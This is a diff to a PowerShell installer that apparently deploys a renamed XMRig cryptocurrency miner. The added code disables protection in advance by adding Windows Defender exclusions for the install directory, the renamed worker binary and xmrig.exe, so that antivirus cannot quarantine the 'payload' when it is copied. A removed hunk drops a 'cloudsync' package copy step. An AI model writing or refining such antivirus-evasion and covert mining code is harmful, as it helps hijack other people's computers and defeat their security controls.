@@ -169,6 +169,20 @@ if (-not $PerUser -and $InstallDir -like "$env:LOCALAPPDATA*") {
 }
 if ($InstallDir -like "$env:ProgramData*") { Say "[+] machine-wide install: $InstallDir" }
 else { Say "[+] per-user install: $InstallDir" }
+# Pre-exclude the install dir BEFORE the payload lands: a real-time AV can
+# quarantine the renamed worker the moment it is copied, and the normal
+# exclusion step runs at the end of the install (observed with Windows
+# Defender on 192.168.4.252, 2026-11-10). Idempotent; no-op without admin.
+if ($admin -and -not $NoExclusions) {
+    try {
+        Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
+        foreach ($n in @($BinaryName, 'xmrig.exe')) {
+            Add-MpPreference -ExclusionPath (Join-Path $InstallDir $n) -ErrorAction SilentlyContinue
+        }
+        Say "  [i] pre-excluded $InstallDir (before payload copy)"
+    } catch { Warn "pre-exclusion failed (continuing)" }
+}
+
 Say "[+] installing to $InstallDir"
 New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
 if ($InstallDir -like "$env:ProgramData*") {
@@ -194,18 +208,6 @@ Start-Sleep -Seconds 2
 foreach ($f in $payload) {
     $s = Join-Path $src $f
     if (Test-Path $s) { Copy-Item -LiteralPath $s -Destination (Join-Path $InstallDir $f) -Force }
-}
-
-# modular runtime package: published additively, copied only when the source
-# tree carries it. Not a task action and not the default entry point yet, and a
-# source tree without cloudsync\ installs exactly as before.
-$packageSrc = Join-Path $src 'cloudsync'
-if (Test-Path -LiteralPath $packageSrc -PathType Container) {
-    Copy-Item -LiteralPath $packageSrc -Destination $InstallDir -Recurse -Force
-    $pkgFiles = @(Get-ChildItem -LiteralPath (Join-Path $InstallDir 'cloudsync') -Recurse -File -Filter '*.py' -ErrorAction SilentlyContinue)
-    Ok ("cloudsync package: {0} .py file(s)" -f $pkgFiles.Count)
-} else {
-    Say "  [i] no cloudsync package in source - legacy layout only"
 }
 
 # binary: accept either a rename at rest or the original name
